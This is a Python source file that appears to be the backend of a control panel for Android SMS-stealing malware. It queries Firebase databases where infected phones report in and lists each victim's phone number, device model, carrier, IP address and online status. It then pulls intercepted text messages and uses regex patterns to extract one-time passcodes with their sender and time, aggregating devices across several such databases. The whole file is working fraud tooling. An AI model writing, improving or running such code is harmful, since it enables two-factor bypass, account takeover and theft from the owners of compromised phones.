# language: Python, file: firebase_client.py, runtime: 3.10+
# *Shallow paths — clients.json + messages/{id}.json — avoids 50MB root download*
import aiohttp
import asyncio
import re
from typing import Any

OTP_PATTERNS = [
    r"(?:otp|OTP|code|Code|CODE|pin|PIN|verification|is)\s*[:=]?\s*(\d{4,8})",
    r"(\d{4,8})\s*(?:is your|otp|OTP|code|Code|PIN|pin)",
    r"(?:is|are)\s+(\d{4,8})",
    r"\b(\d{6})\b",
    r"\b(\d{4})\b",
]

def extract_otp(text: str) -> str | None:
    if not text:
        return None
    for pat in OTP_PATTERNS:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            code = m.group(1)
            if code.startswith("20") and len(code) == 4:
                continue
            return code
    return None

async def fetch_json(session: aiohttp.ClientSession, url: str, key: str = "") -> Any:
    base = url.rstrip("/")
    if not base.endswith(".json"):
        full = f"{base}.json"
    else:
        full = base
    if key:
        sep = "&" if "?" in full else "?"
        full = f"{full}{sep}auth={key}"
    try:
        async with session.get(full, timeout=aiohttp.ClientTimeout(total=90)) as resp:
            if resp.status != 200:
                return None
            return await resp.json(content_type=None)
    except Exception as e:
        print(f"[fb] fetch error {full[:80]}… {e}")
        return None

def _parse_battery(raw) -> int:
    try:
        return int(float(str(raw).replace("%", "").strip()))
    except Exception:
        return 0

def _device_from_client(cid: str, raw: dict) -> dict:
    phone = (
        raw.get("mobNo")
        or raw.get("phone")
        or raw.get("number")
        or raw.get("phoneNumber")
        or raw.get("mobile")
        or ""
    )
    if not phone and isinstance(raw.get("sims"), list) and raw["sims"]:
        phone = raw["sims"][0].get("phoneNumber") or ""

    battery = _parse_battery(raw.get("battery") or raw.get("batteryPercent") or 0)
    android = raw.get("androidV") or raw.get("android") or raw.get("os") or raw.get("version") or "?"
    network = (
        raw.get("service_provider")
        or raw.get("network")
        or raw.get("carrier")
        or raw.get("net")
        or "?"
    )
    ip = raw.get("ip_address") or raw.get("ip") or raw.get("IP") or "?"
    model = raw.get("modelName") or raw.get("model") or raw.get("device") or cid
    last_seen = raw.get("joined") or raw.get("lastSeen") or raw.get("last_seen") or "-"
    # accept bool True, string "true"/"1"/"online", int 1
    st = raw.get("status", raw.get("online", raw.get("isOnline")))
    if isinstance(st, str):
        online = st.strip().lower() in ("true", "1", "online", "yes", "active")
    elif isinstance(st, (int, float)):
        online = st == 1
    else:
        online = st is True

    return {
        "id": str(cid),
        "phone": str(phone) if phone else str(cid),
        "model": str(model),
        "battery": battery,
        "android": str(android),
        "network": str(network),
        "ip": str(ip),
        "last_seen": str(last_seen),
        "database": "Firebase",
        "online": online,
        "otp_code": None,
        "otp_sender": None,
        "otp_time": None,
        "raw": raw,
    }

async def _attach_latest_otp(session, fb_url: str, fb_key: str, dev: dict) -> None:
    """Fetch messages/{id} only for this device — lightweight."""
    path = f"{fb_url.rstrip('/')}/messages/{dev['id']}"
    data = await fetch_json(session, path, fb_key)
    if not isinstance(data, dict) or not data:
        return
    try:
        items = sorted(data.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0, reverse=True)
    except Exception:
        items = list(data.items())[::-1]
    for _, msg in items[:50]:
        if not isinstance(msg, dict):
            continue
        body = msg.get("message") or msg.get("body") or msg.get("text") or ""
        code = extract_otp(body) or msg.get("code") or msg.get("otp")
        if code:
            dev["otp_code"] = str(code)
            dev["otp_sender"] = msg.get("sender") or msg.get("from") or msg.get("address") or "?"
            dev["otp_time"] = str(msg.get("dateTime") or msg.get("time") or msg.get("date") or "-")
            return

async def get_devices(fb_url: str, fb_key: str, with_otp: bool = True) -> list[dict]:
    """
    Prefer shallow nodes:
      clients.json   (device list)
      messages/{id}  (OTP per device, only when needed)
    Fallback: devices / users / root.
    """
    base = fb_url.rstrip("/")
    async with aiohttp.ClientSession() as session:
        # 1) clients (FREE X PANEL style)
        clients = await fetch_json(session, f"{base}/clients", fb_key)
        if isinstance(clients, dict) and clients:
            devices = [_device_from_client(cid, raw) for cid, raw in clients.items() if isinstance(raw, dict)]
            if with_otp and devices:
                # only fetch OTP for online first, then a sample of rest (speed)
                online = [d for d in devices if d["online"]]
                offline = [d for d in devices if not d["online"]]
                # parallel OTP fetch — limit concurrency
                sem = asyncio.Semaphore(15)

                async def one(d):
                    async with sem:
                        await _attach_latest_otp(session, base, fb_key, d)

                # online all + first 30 offline
                targets = online + offline[:30]
                await asyncio.gather(*[one(d) for d in targets])
            return devices

        # 2) devices/
        node = await fetch_json(session, f"{base}/devices", fb_key)
        if isinstance(node, dict) and node:
            return [_device_from_client(cid, raw) for cid, raw in node.items() if isinstance(raw, dict)]

        # 3) users / All_Users
        for key in ("All_Users", "users", "registeredDevices"):
            node = await fetch_json(session, f"{base}/{key}", fb_key)
            if isinstance(node, dict) and node:
                return [_device_from_client(cid, raw) for cid, raw in node.items() if isinstance(raw, dict)]

        # 4) full root last resort
        root = await fetch_json(session, base, fb_key)
        if not isinstance(root, dict):
            return []
        for key in ("clients", "devices", "All_Users", "users"):
            node = root.get(key)
            if isinstance(node, dict) and node:
                return [_device_from_client(cid, raw) for cid, raw in node.items() if isinstance(raw, dict)]
        return []

async def get_all_otps(fb_url: str, fb_key: str, device_id: str) -> list[dict]:
    async with aiohttp.ClientSession() as session:
        data = await fetch_json(session, f"{fb_url.rstrip('/')}/messages/{device_id}", fb_key)
        if not data:
            return []
        results = []
        if isinstance(data, dict):
            try:
                items = sorted(data.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0, reverse=True)
            except Exception:
                items = list(data.items())
            for k, v in items:
                if not isinstance(v, dict):
                    continue
                body = v.get("message") or v.get("body") or v.get("text") or ""
                results.append({
                    "id": str(k),
                    "body": body,
                    "otp": extract_otp(body) or v.get("code") or v.get("otp"),
                    "sender": v.get("sender") or v.get("from") or v.get("address") or "?",
                    "time": v.get("dateTime") or v.get("time") or v.get("date") or "-",
                })
        return results

async def aggregate_all_accounts(accounts: list[dict]) -> tuple[list[dict], int]:
    all_devs: list[dict] = []
    total_otps = 0
    for acc in accounts:
        if not acc.get("active", True):
            continue
        print(f"[fb] loading {acc.get('name')} {acc.get('url')}")
        try:
            devs = await get_devices(acc["url"], acc.get("key") or "", with_otp=False)
            on = sum(1 for d in devs if d.get("online"))
            print(f"[fb] got {len(devs)} devices ({on} online)")
        except Exception as e:
            print(f"[fb] error {e}")
            continue
        for d in devs:
            d["fb_id"] = acc["id"]
            d["fb_name"] = acc.get("name", "DB")
            if d.get("otp_code"):
                total_otps += 1
        all_devs.extend(devs)
    return all_devs, total_otps
